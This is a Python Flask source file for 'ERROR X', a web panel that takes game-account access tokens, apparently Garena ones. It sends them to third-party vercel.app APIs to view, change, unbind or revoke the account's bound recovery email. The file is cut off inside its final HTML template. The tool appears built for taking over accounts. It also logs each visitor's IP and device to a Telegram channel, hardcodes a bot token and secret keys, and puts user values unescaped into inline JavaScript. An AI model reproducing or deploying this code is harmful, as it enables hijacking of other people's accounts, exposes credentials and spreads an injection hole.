from flask import Flask, render_template_string, request, redirect, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os
import requests
import json
import hashlib
import time

app = Flask(__name__)
app.secret_key = "error_x_secret_2026"

# ============ DATABASE ============
basedir = os.path.abspath(os.path.dirname(__file__))
db_path = os.path.join(basedir, "error_x.db")
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# ============ CONFIG ============
BOT_TOKEN = "8942532097:AAFWVLTYYgOnp-1aIUdOFYql1bHXhN4sey4"
ACCESS_KEY = "ERROR-X-OWNER"
ADMIN_KEY = "ERROR-X-ADMIN"

# ============ DATABASE MODELS ============
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    display_id = db.Column(db.Integer, unique=True, nullable=False)
    username = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    device = db.Column(db.String(200))
    battery = db.Column(db.String(20))
    access_token = db.Column(db.String(200))
    joined_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_banned = db.Column(db.Boolean, default=False)

class BannedIP(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(50), unique=True)
    banned_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

def get_next_display_id():
    last = User.query.order_by(User.display_id.desc()).first()
    return last.display_id + 1 if last else 1001

def is_ip_banned(ip):
    return BannedIP.query.filter_by(ip=ip).first() is not None

def send_to_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': '@Errorzlive', 'text': text, 'parse_mode': 'HTML'}, timeout=5)
    except:
        pass

def is_success(rsp):
    if rsp.status_code != 200:
        return False
    try:
        rj = rsp.json()
        if not rj.get("success"):
            return False
        data = rj.get("data", {})
        if isinstance(data, dict):
            if data.get("error"):
                return False
            g_resp = data.get("garena_response", {})
            if isinstance(g_resp, dict) and g_resp.get("error"):
                return False
        err_node = rj.get("error")
        if err_node:
            return False
        return True
    except:
        return False

def check_bind(access_token):
    try:
        url = "https://bindinfocrownx612.vercel.app/check"
        params = {'access_token': access_token}
        rsp = requests.get(url, params=params, timeout=10)
        if is_success(rsp):
            data = rsp.json()
            inner_data = data.get("data", {}) if data.get("data") else data
            return {
                'status': inner_data.get('status', 'N/A'),
                'current_email': inner_data.get('current_email', 'N/A'),
                'pending_email': inner_data.get('pending_email', 'N/A'),
                'email_to_be': inner_data.get('email_to_be', 'N/A'),
                'countdown': inner_data.get('countdown_human', 'N/A')
            }
        return None
    except:
        return None

def send_otp(access, email, otp_type="normal"):
    try:
        if otp_type == "normal":
            url = "https://chngemailcode48.vercel.app/send_otp"
            params = {'access_token': access, 'email': email}
        elif otp_type == "current":
            url = "https://chngeforgotcrownx72.vercel.app/otp"
            params = {'access_token': access, 'current_email': email}
        elif otp_type == "new":
            url = "https://chngeforgotcrownx72.vercel.app/newotp"
            params = {'access_token': access, 'new_email': email}
        else:
            return False, None
        rsp = requests.get(url, params=params, timeout=10)
        if is_success(rsp):
            return True, rsp.json()
        return False, None
    except:
        return False, None

def verify_otp(access, email, otp, otp_type="normal"):
    try:
        if otp_type == "normal":
            url = "https://chngemailcode48.vercel.app/verify_otp"
            params = {'access_token': access, 'email': email, 'otp': otp}
        elif otp_type == "current":
            url = "https://chngeforgotcrownx72.vercel.app/verify"
            params = {'access_token': access, 'current_email': email, 'otp': otp}
        elif otp_type == "new":
            url = "https://chngeforgotcrownx72.vercel.app/newverify"
            params = {'access_token': access, 'new_email': email, 'otp': otp}
        else:
            return False, None
        rsp = requests.get(url, params=params, timeout=10)
        if is_success(rsp):
            data = rsp.json()
            verifier = data.get("verifier_token") or data.get("data", {}).get("verifier_token")
            return True, verifier
        return False, None
    except:
        return False, None

def verify_identity(access, sec_code):
    try:
        url = "https://chngemailcode48.vercel.app/verify_identity"
        params = {'access_token': access, 'code': sec_code}
        rsp = requests.get(url, params=params, timeout=10)
        if is_success(rsp):
            data = rsp.json()
            identity = data.get("identity_token") or data.get("data", {}).get("identity_token")
            return True, identity
        return False, None
    except:
        return False, None

def create_rebind(access, email, identity_token, verifier_token):
    try:
        url = "https://chngemailcode48.vercel.app/create_rebind"
        params = {
            'access_token': access,
            'email': email,
            'identity_token': identity_token,
            'verifier_token': verifier_token
        }
        rsp = requests.get(url, params=params, timeout=10)
        if is_success(rsp):
            return True, "Email changed successfully!"
        return False, "Failed to change email"
    except:
        return False, "Error"

# ============ FIXED: Yeh function ab OTPs dobara nahi bhejta, sirf verify karta hai ============
def change_email_no_sec_final(access, cur_email, new_email, otp1, otp2):
    """
    FIX: Yeh function SIRF verify karta hai, OTPs dobara nahi bhejta.
    OTPs already Step 1 aur Step 2 mein bheje ja chuke hain.
    """
    try:
        # Step 1: Verify OTP for current email (verify only, NO re-send)
        url2 = "https://chngeforgotcrownx72.vercel.app/verify"
        rsp2 = requests.get(url2, params={'access_token': access, 'current_email': cur_email, 'otp': otp1}, timeout=10)
        if not is_success(rsp2):
            return False, "Invalid or expired OTP for current email"
        
        identity = rsp2.json().get("identity_token") or rsp2.json().get("data", {}).get("identity_token")
        if not identity:
            return False, "Failed to get identity token"
        
        # Step 2: Verify OTP for new email (verify only, NO re-send)
        url4 = "https://chngeforgotcrownx72.vercel.app/newverify"
        rsp4 = requests.get(url4, params={'access_token': access, 'new_email': new_email, 'otp': otp2}, timeout=10)
        if not is_success(rsp4):
            return False, "Invalid or expired OTP for new email"
        
        verifier = rsp4.json().get("verifier_token") or rsp4.json().get("data", {}).get("verifier_token")
        if not verifier:
            return False, "Failed to get verifier token"
        
        # Step 3: Execute the change
        url5 = "https://chngeforgotcrownx72.vercel.app/change"
        rsp5 = requests.get(url5, params={
            'access_token': access,
            'new_email': new_email,
            'identity_token': identity,
            'verifier_token': verifier
        }, timeout=10)
        if is_success(rsp5):
            return True, "Email changed successfully!"
        
        # Agar fail ho toh response ka error message lena
        try:
            err_detail = rsp5.json()
            err_msg = err_detail.get('error') or err_detail.get('message') or 'Unknown error'
            # Agar data key mein error ho
            if isinstance(err_detail.get('data'), dict):
                err_msg = err_detail['data'].get('error', err_msg)
            return False, f"Failed: {err_msg}"
        except:
            return False, "Failed to change email"
    except Exception as e:
        return False, f"Error: {str(e)}"


# ============ OLD function ko rahne do but use nahi karenge ============
def change_email_no_sec(access, cur_email, new_email, otp1, otp2):
    """OLD - DO NOT USE. Use change_email_no_sec_final instead."""
    try:
        url1 = "https://chngeforgotcrownx72.vercel.app/otp"
        rsp1 = requests.get(url1, params={'access_token': access, 'current_email': cur_email}, timeout=10)
        if not is_success(rsp1):
            return False, "Failed to send OTP to current email"
        
        url2 = "https://chngeforgotcrownx72.vercel.app/verify"
        rsp2 = requests.get(url2, params={'access_token': access, 'current_email': cur_email, 'otp': otp1}, timeout=10)
        if not is_success(rsp2):
            return False, "Invalid OTP for current email"
        
        identity = rsp2.json().get("identity_token") or rsp2.json().get("data", {}).get("identity_token")
        
        url3 = "https://chngeforgotcrownx72.vercel.app/newotp"
        rsp3 = requests.get(url3, params={'access_token': access, 'new_email': new_email}, timeout=10)
        if not is_success(rsp3):
            return False, "Failed to send OTP to new email"
        
        url4 = "https://chngeforgotcrownx72.vercel.app/newverify"
        rsp4 = requests.get(url4, params={'access_token': access, 'new_email': new_email, 'otp': otp2}, timeout=10)
        if not is_success(rsp4):
            return False, "Invalid OTP for new email"
        
        verifier = rsp4.json().get("verifier_token") or rsp4.json().get("data", {}).get("verifier_token")
        
        url5 = "https://chngeforgotcrownx72.vercel.app/change"
        rsp5 = requests.get(url5, params={
            'access_token': access,
            'new_email': new_email,
            'identity_token': identity,
            'verifier_token': verifier
        }, timeout=10)
        if is_success(rsp5):
            return True, "Email changed successfully!"
        return False, "Failed to change email"
    except:
        return False, "Error"

def unbind_with_sec(access, sec_code):
    try:
        url = "https://crownxnewkey10010.vercel.app/securityunbind"
        rsp = requests.get(url, params={'access_token': access, 'security_code': sec_code}, timeout=10)
        if is_success(rsp):
            return True, "Unbind request created! 15 Days Timer Started."
        return False, "Failed to unbind"
    except:
        return False, "Error"

def unbind_no_sec(access, cur_email, otp):
    try:
        url1 = "https://chngeforgotcrownx72.vercel.app/otp"
        rsp1 = requests.get(url1, params={'access_token': access, 'current_email': cur_email}, timeout=10)
        if not is_success(rsp1):
            return False, "Failed to send OTP"
        
        url2 = "https://chngeforgotcrownx72.vercel.app/verify"
        rsp2 = requests.get(url2, params={'access_token': access, 'current_email': cur_email, 'otp': otp}, timeout=10)
        if not is_success(rsp2):
            return False, "Invalid OTP"
        
        identity = rsp2.json().get("identity_token") or rsp2.json().get("data", {}).get("identity_token")
        
        url3 = "https://crownxforgotremove23.vercel.app/forgotunbind"
        rsp3 = requests.get(url3, params={'access_token': access, 'identity_token': identity}, timeout=10)
        if is_success(rsp3):
            return True, "Unbind request created! 15 Days Timer Started."
        return False, "Failed to unbind"
    except:
        return False, "Error"

def revoke_token(access):
    try:
        url = "https://crownxrevoker73.vercel.app/revoke"
        rsp = requests.get(url, params={'access_token': access}, timeout=10)
        if is_success(rsp):
            return True, "Token revoked successfully!"
        return False, "Failed to revoke token"
    except:
        return False, "Error"

def cancel_bind(access):
    try:
        url = "https://bindcnclcrownx34.vercel.app/cancelbind"
        rsp = requests.get(url, params={'access_token': access}, timeout=10)
        if is_success(rsp):
            return True, "Request cancelled successfully!"
        return False, "Failed to cancel"
    except:
        return False, "Error"

# ============ CSS with background ============
CSS_WITH_BG = """<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
body{min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;position:relative;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://i.ibb.co/C3rBq6cV/photo-AQADQBBr-Gx-m-GFZ9.jpg');background-size:cover;background-position:center;background-repeat:no-repeat;opacity:0.15;z-index:-1;pointer-events:none}
.card{background:rgba(10,10,10,0.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-radius:30px;padding:40px;max-width:500px;width:100%;border:1px solid #ff000066;box-shadow:0 0 60px rgba(255,0,0,0.1);position:relative;z-index:1}
.card h1{font-size:22px;color:#ff0000;text-align:center;margin-bottom:25px}
.input-group{margin-bottom:18px}.input-group label{display:block;color:#ff000088;font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
.input-group input,.input-group select{width:100%;padding:12px 16px;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:12px;color:#ff6666;font-size:14px;transition:.3s}
.input-group input:focus{outline:none;border-color:#ff0000;box-shadow:0 0 20px rgba(255,0,0,0.1)}
.btn{width:100%;padding:12px;background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:12px;color:#0a0a0a;font-weight:bold;cursor:pointer;font-size:15px;transition:.3s;letter-spacing:1px}
.btn:hover{transform:translateY(-2px);box-shadow:0 10px 40px rgba(255,0,0,0.3)}
.error{background:rgba(255,0,0,0.15);border:1px solid #ff000066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#ff6666;font-size:12px}
.success{background:rgba(0,255,0,0.1);border:1px solid #00ff0066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#66ff66;font-size:12px}
.back-link{display:block;text-align:center;margin-top:20px;color:#ff000088;text-decoration:none;font-size:12px;letter-spacing:1px}
.back-link:hover{color:#ff0000}
</style>"""

# ============ INDEX PAGE WITH BG ============
INDEX_HTML = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ERROR X BIND</title>
{CSS_WITH_BG}
<style>
.logo{{text-align:center;margin-bottom:25px}}
.logo h1{{font-size:32px;font-weight:900;background:linear-gradient(135deg,#ff0000,#cc0000);-webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.logo p{{color:#ff000088;font-size:13px;margin-top:5px}}
.sub{{color:#ff000088;text-align:center;font-size:12px;margin-bottom:25px;letter-spacing:2px}}
.footer{{text-align:center;margin-top:25px;font-size:10px;color:#ff000044}}
.footer a{{color:#ff000088;text-decoration:none}}
.admin-btn{{display:block;width:100%;padding:12px;margin-top:10px;background:rgba(255,0,0,0.08);border:1px solid #ff000044;border-radius:12px;color:#ff000088;text-align:center;text-decoration:none;font-size:13px;transition:.3s}}
.admin-btn:hover{{background:rgba(255,0,0,0.18);border-color:#ff0000;color:#ff6666}}
</style>
</head>
<body>
<div style="width:100%;max-width:500px;padding:20px">
<div class="card">
<div class="logo"><h1>ERROR X</h1><p>BIND TOOL</p></div>
<p class="sub">ENTER ACCESS KEY</p>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
<form method="POST" action="/login">
<div class="input-group"><label>ACCESS KEY</label><input type="password" name="key" placeholder="ENTER ACCESS KEY" required autofocus></div>
<button type="submit" class="btn">ACCESS</button>
</form>
<div class="footer">
<a href="https://t.me/Errorzlive" target="_blank" style="color:#ff000088;">SUPPORT</a>
<a href="/admin-login" class="admin-btn">ADMIN PANEL</a>
<br><br>
DEVELOPER - @Errorzlive
</div>
</div>
</div>
</body>
</html>"""

# ============ ROUTES ============

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect('/dashboard')
    return render_template_string(INDEX_HTML)

@app.route('/login', methods=['POST'])
def login():
    key = request.form.get('key')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    if is_ip_banned(ip):
        return render_template_string(INDEX_HTML, error="YOU ARE BANNED!")
    
    if key != ACCESS_KEY:
        return render_template_string(INDEX_HTML, error="INVALID ACCESS KEY!")
    
    existing = User.query.filter_by(ip=ip).first()
    if existing:
        if existing.is_banned:
            return render_template_string(INDEX_HTML, error="YOU ARE BANNED!")
        session['user_id'] = existing.id
        return redirect('/dashboard')
    
    display_id = get_next_display_id()
    user = User(display_id=display_id, ip=ip, device=ua[:200])
    db.session.add(user)
    db.session.commit()
    session['user_id'] = user.id
    
    send_to_telegram(f"🔔 <b>NEW LOGIN</b>\n\nID: {display_id}\nIP: {ip}\nDevice: {ua[:50]}")
    
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/')
    user = User.query.get(session['user_id'])
    if not user or user.is_banned:
        session.clear()
        return redirect('/')
    
    bind = None
    if user.access_token:
        bind = check_bind(user.access_token)
    
    return render_template_string(DASHBOARD_HTML, user=user, bind=bind)

# Dashboard HTML with buttons grid
DASHBOARD_HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ERROR X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
body{background:#0a0a0a;min-height:100vh;color:#ff6666}
.navbar{background:rgba(10,10,10,0.95);padding:15px 25px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #ff000033;flex-wrap:wrap;gap:10px}
.navbar h1{font-size:20px;color:#ff0000}
.nav-right{display:flex;align-items:center;gap:15px}
.nav-right .id-badge{color:#ff000088;font-size:11px;border:1px solid #ff000033;padding:4px 14px;border-radius:20px}
.container{padding:30px;max-width:900px;margin:0 auto}
.info-card{background:rgba(255,0,0,0.03);border-radius:20px;padding:25px;border:1px solid #ff000022;margin-bottom:30px}
.info-card h2{font-size:16px;color:#ff0000;margin-bottom:15px}
.info-row{padding:8px 0;border-bottom:1px solid rgba(255,0,0,0.08);display:flex;justify-content:space-between;font-size:13px;flex-wrap:wrap}
.info-row .label{color:#ff000088}
.info-row .value{color:#ff6666;font-weight:bold}
.copy-btn{background:rgba(255,0,0,0.15);border:none;border-radius:8px;padding:4px 12px;color:#ff0000;cursor:pointer;font-size:11px;transition:0.3s}
.copy-btn:hover{background:rgba(255,0,0,0.25)}
.btn-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:20px}
.btn-grid a{padding:14px 10px;background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:12px;color:#0a0a0a;font-weight:bold;cursor:pointer;text-decoration:none;text-align:center;font-size:12px;transition:.3s}
.btn-grid a:hover{transform:translateY(-2px);box-shadow:0 10px 40px rgba(255,0,0,0.3)}
.btn-ghost{padding:12px 25px;background:transparent;border:1px solid #ff000044;border-radius:12px;color:#ff6666;text-decoration:none;display:inline-block;text-align:center;font-size:13px;transition:.3s}
.btn-ghost:hover{background:rgba(255,0,0,0.08)}
.footer{text-align:center;margin-top:40px;font-size:10px;color:#ff000044;padding:15px;border-top:1px solid #ff000011}
@media(max-width:600px){.btn-grid{grid-template-columns:1fr 1fr}}
</style>
</head>
<body>
<div class="navbar"><h1>ERROR X</h1><div class="nav-right"><span class="id-badge">ID: {{ user.display_id }}</span></div></div>
<div class="container">
<div class="info-card">
<h2>RECOVERY MAIL INFO</h2>
{% if bind %}
<div class="info-row"><span class="label">STATUS</span><span class="value">{{ bind.status }}</span></div>
<div class="info-row"><span class="label">CURRENT EMAIL</span><span class="value">{{ bind.current_email }} <button class="copy-btn" onclick="copyText('{{ bind.current_email }}')">COPY</button></span></div>
<div class="info-row"><span class="label">PENDING EMAIL</span><span class="value">{{ bind.pending_email }}</span></div>
<div class="info-row"><span class="label">EMAIL TO BE</span><span class="value">{{ bind.email_to_be }}</span></div>
<div class="info-row"><span class="label">COUNTDOWN</span><span class="value">{{ bind.countdown }}</span></div>
{% else %}
<div class="info-row"><span class="label">Enter Access Token to fetch info:</span></div>
<form method="POST" action="/set-token" style="margin-top:15px;display:flex;gap:10px">
<input type="text" name="access_token" placeholder="Enter Access Token" style="flex:1;padding:12px;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:12px;color:#ff6666">
<button type="submit" style="padding:12px 25px;background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:12px;color:#0a0a0a;font-weight:bold;cursor:pointer">FETCH</button>
</form>
{% endif %}
</div>
<div class="btn-grid">
<a href="/check-bind">CHECK MAIL</a>
<a href="/change-email-sec">CHANGE (SEC)</a>
<a href="/change-email-otp">CHANGE (OTP)</a>
<a href="/unbind">UNBIND</a>
<a href="/revoke">REVOKE</a>
<a href="/cancel-bind">CANCEL</a>
</div>
<div style="text-align:center">
<a href="https://t.me/Errorzlive" class="btn-ghost">TELEGRAM</a>
<a href="/logout" class="btn-ghost" style="margin-left:10px">LOGOUT</a>
</div>
</div>
<div class="footer">DEVELOPER - @Errorzlive</div>
<script>
function copyText(t){navigator.clipboard.writeText(t).then(function(){alert('Copied: '+t)})}
</script>
</body>
</html>"""

@app.route('/set-token', methods=['POST'])
def set_token():
    if 'user_id' not in session:
        return redirect('/')
    user = User.query.get(session['user_id'])
    if user:
        user.access_token = request.form.get('access_token')
        db.session.commit()
    return redirect('/dashboard')

@app.route('/check-bind', methods=['GET', 'POST'])
def check_bind_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access_token = request.form.get('access_token')
        if not access_token:
            return render_template_string(CHECK_HTML, error="Access Token required!")
        bind = check_bind(access_token)
        if bind:
            return render_template_string(CHECK_HTML, bind=bind)
        return render_template_string(CHECK_HTML, error="Failed to fetch bind info!")
    return render_template_string(CHECK_HTML)

CHECK_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Check Bind</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
<h1>CHECK RECOVERY MAIL</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
{{% if bind %}}
<div class="success" style="text-align:left;">
<div><strong>STATUS:</strong> {{{{ bind.status }}}}</div>
<div><strong>CURRENT:</strong> {{{{ bind.current_email }}}}</div>
<div><strong>PENDING:</strong> {{{{ bind.pending_email }}}}</div>
<div><strong>TO BE:</strong> {{{{ bind.email_to_be }}}}</div>
<div><strong>TIMER:</strong> {{{{ bind.countdown }}}}</div>
</div>
{{% endif %}}
<form method="POST" action="/check-bind"><div class="input-group"><label>ACCESS TOKEN</label><input type="text" name="access_token" placeholder="Enter Access Token" required></div>
<button type="submit" class="btn">CHECK</button></form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div></body></html>"""

# ============ CHANGE EMAIL WITH SEC (SECURITY CODE WALA - FIXED) ============
@app.route('/change-email-sec', methods=['GET', 'POST'])
def change_email_sec_route():
    if 'user_id' not in session:
        return redirect('/')
    if request.method == 'POST':
        access = request.form.get('access_token')
        current_email = request.form.get('current_email')
        sec_code = request.form.get('sec_code')
        new_email = request.form.get('new_email')
        
        if not all([access, current_email, sec_code, new_email]):
            return render_template_string(CES_HTML, error="All fields required!")
        
        success, identity = verify_identity(access, sec_code)
        if not success:
            return render_template_string(CES_HTML, error="Invalid Security Code!")
        
        ok, _ = send_otp(access, new_email, "new")
        if not ok:
            return render_template_string(CES_HTML, error="Failed to send OTP to new email!")
        
        return render_template_string(CES_OTP_HTML, 
            access_token=access, 
            current_email=current_email, 
            new_email=new_email, 
            sec_code=sec_code
        )
    return render_template_string(CES_HTML)

CES_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Change Email</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
<h1>CHANGE MAIL (WITH SECURITY CODE)</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
{{% if success %}}<div class="success">{{{{ success }}}}</div>{{% endif %}}
<form method="POST" action="/change-email-sec">
<div class="input-group"><label>ACCESS TOKEN</label><input type="text" name="access_token" placeholder="Enter Access Token" required></div>
<div class="input-group"><label>CURRENT BIND EMAIL</label><input type="email" name="current_email" placeholder="Enter Current Bound Email" required></div>
<div class="input-group"><label>SECURITY CODE</label><input type="text" name="sec_code" placeholder="Enter Security Code" required></div>
<div class="input-group"><label>NEW EMAIL</label><input type="email" name="new_email" placeholder="Enter New Email" required></div>
<button type="submit" class="btn">SEND OTP TO NEW EMAIL</button>
</form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div></body></html>"""

CES_OTP_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Verify OTP</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
<h1>VERIFY OTP FOR NEW EMAIL</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
{{% if success %}}<div class="success">{{{{ success }}}}</div>{{% endif %}}
<p style="color:#ff000088;text-align:center;font-size:13px;margin-bottom:20px">OTP sent to {{{{ new_email }}}}</p>
<form method="POST" action="/change-email-sec-otp">
<div class="input-group"><label>OTP CODE (NEW EMAIL)</label><input type="text" name="otp_new" placeholder="Enter OTP from New Email" required></div>
<button type="submit" class="btn">VERIFY & CHANGE</button>
<input type="hidden" name="access_token" value="{{{{ access_token }}}}">
<input type="hidden" name="current_email" value="{{{{ current_email }}}}">
<input type="hidden" name="new_email" value="{{{{ new_email }}}}">
<input type="hidden" name="sec_code" value="{{{{ sec_code }}}}">
</form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div></body></html>"""

@app.route('/change-email-sec-otp', methods=['POST'])
def change_email_sec_otp_route():
    if 'user_id' not in session:
        return redirect('/')
    
    access = request.form.get('access_token')
    current_email = request.form.get('current_email')
    new_email = request.form.get('new_email')
    sec_code = request.form.get('sec_code')
    otp_new = request.form.get('otp_new')
    
    if not all([access, new_email, otp_new]):
        return redirect('/change-email-sec')
    
    success, verifier = verify_otp(access, new_email, otp_new, "new")
    if not success:
        return render_template_string(CES_OTP_HTML,
            access_token=access, current_email=current_email,
            new_email=new_email, sec_code=sec_code,
            error="Invalid OTP for new email!"
        )
    
    # FIX: verify_identity dobara karte hain kyunki yeh stateless API hai
    ok, identity = verify_identity(access, sec_code)
    if not ok:
        return render_template_string(CES_OTP_HTML,
            access_token=access, current_email=current_email,
            new_email=new_email, sec_code=sec_code,
            error="Security code verification failed! Please start again."
        )
    
    done, msg = create_rebind(access, new_email, identity, verifier)
    if done:
        send_to_telegram(f"✅ <b>EMAIL CHANGED</b>\n\nNew Email: {new_email}")
        return render_template_string(CES_OTP_HTML, 
            success=f"Email changed to {new_email}!",
            access_token=access, current_email=current_email,
            new_email=new_email, sec_code=sec_code
        )
    return render_template_string(CES_OTP_HTML,
        access_token=access, current_email=current_email,
        new_email=new_email, sec_code=sec_code,
        error=msg
    )

# ============ FIXED: CHANGE EMAIL WITH OTP (AB OTPS DOBARA NAHI BHEJTA) ============
@app.route('/change-email-otp', methods=['GET', 'POST'])
def change_email_otp_route():
    if 'user_id' not in session:
        return redirect('/')
    
    if request.method == 'POST':
        step = int(request.form.get('step', 1))
        
        if step == 1:
            access = request.form.get('access_token')
            current_email = request.form.get('current_email')
            if not access or not current_email:
                return render_template_string(CEO_HTML, step=1, error="All fields required!")
            ok, _ = send_otp(access, current_email, "current")
            if not ok:
                return render_template_string(CEO_HTML, step=1, error="Failed to send OTP to current email!")
            return render_template_string(CEO_STEP2_HTML, 
                access_token=access, 
                current_email=current_email
            )
        
        elif step == 2:
            access = request.form.get('access_token')
            current_email = request.form.get('current_email')
            otp1 = request.form.get('otp1')
            new_email = request.form.get('new_email')
            if not all([access, current_email, otp1, new_email]):
                return render_template_string(CEO_HTML, step=2, 
                    error="All fields required!",
                    access_token=access, current_email=current_email
                )
            ok, _ = verify_otp(access, current_email, otp1, "current")
            if not ok:
                return render_template_string(CEO_STEP2_HTML,
                    error="Invalid OTP for current email!",
                    access_token=access, current_email=current_email
                )
            ok2, _ = send_otp(access, new_email, "new")
            if not ok2:
                return render_template_string(CEO_STEP2_HTML,
                    error="Failed to send OTP to new email!",
                    access_token=access, current_email=current_email
                )
            return render_template_string(CEO_STEP3_HTML,
                access_token=access, 
                current_email=current_email, 
                new_email=new_email,
                otp1=otp1
            )
        
        elif step == 3:
            access = request.form.get('access_token')
            current_email = request.form.get('current_email')
            new_email = request.form.get('new_email')
            otp2 = request.form.get('otp2')
            otp1 = request.form.get('otp1')
            if not all([access, current_email, new_email, otp2, otp1]):
                return render_template_string(CEO_STEP3_HTML,
                    error="All fields required!",
                    access_token=access, current_email=current_email, new_email=new_email,
                    otp1=otp1, step=3
                )
            # FIX: change_email_no_sec_final ab OTPs dobara nahi bhejega
            success, msg = change_email_no_sec_final(access, current_email, new_email, otp1, otp2)
            if success:
                send_to_telegram(f"✅ <b>EMAIL CHANGED (OTP)</b>\n\nNew Email: {new_email}")
                return render_template_string(CEO_HTML, success=msg, step=1)
            return render_template_string(CEO_STEP3_HTML,
                error=msg,
                access_token=access, current_email=current_email, 
                new_email=new_email, otp1=otp1, step=3
            )
    
    return render_template_string(CEO_HTML, step=1)

# CEO Templates
CEO_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Change Email</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
<h1>CHANGE MAIL (WITH OTP)</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
{{% if success %}}<div class="success">{{{{ success }}}}</div>{{% endif %}}
<div style="text-align:center;color:#ff000066;font-size:11px;margin-bottom:20px">STEP {{{{ step or 1 }}}} OF 3</div>
<form method="POST" action="/change-email-otp">
{{% if step == 1 or not step %}}
<div class="input-group"><label>ACCESS TOKEN</label><input type="text" name="access_token" placeholder="Enter Access Token" required></div>
<div class="input-group"><label>CURRENT BIND EMAIL</label><input type="email" name="current_email" placeholder="Enter Current Bound Email" required></div>
<button type="submit" class="btn">SEND OTP TO CURRENT EMAIL</button>
{{% endif %}}
<input type="hidden" name="step" value="{{{{ step or 1 }}}}">
</form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div></body></html>"""

CEO_STEP2_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Step 2</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
<h1>CHANGE MAIL (WITH OTP)</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
<div style="text-align:center;color:#ff000066;font-size:11px;margin-bottom:20px">STEP 2 OF 3 - VERIFY CURRENT EMAIL</div>
<p style="color:#00ff0088;text-align:center;font-size:12px;margin-bottom:20px">✓ OTP sent to your current email!</p>
<form method="POST" action="/change-email-otp">
<div class="input-group"><label>OTP CODE (CURRENT EMAIL)</label><input type="text" name="otp1" placeholder="Enter OTP from Current Email" required></div>
<div class="input-group"><label>NEW EMAIL</label><input type="email" name="new_email" placeholder="Enter New Email" required></div>
<button type="submit" class="btn">VERIFY & SEND OTP TO NEW EMAIL</button>
<input type="hidden" name="step" value="2">
<input type="hidden" name="access_token" value="{{{{ access_token }}}}">
<input type="hidden" name="current_email" value="{{{{ current_email }}}}">
</form>
<a href="/dashboard" class="back-link">← BACK</a>
</div></div></body></html>"""

CEO_STEP3_HTML = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Step 3</title>{CSS_WITH_BG}</head>
<body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
<h1>CHANGE MAIL (WITH OTP)</h1>
{{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
<div style="text-align:center;color:#ff000066;font-size:11px;margin-bottom:20px">STEP 3 OF 3 - FINAL VERIFICATION</div>
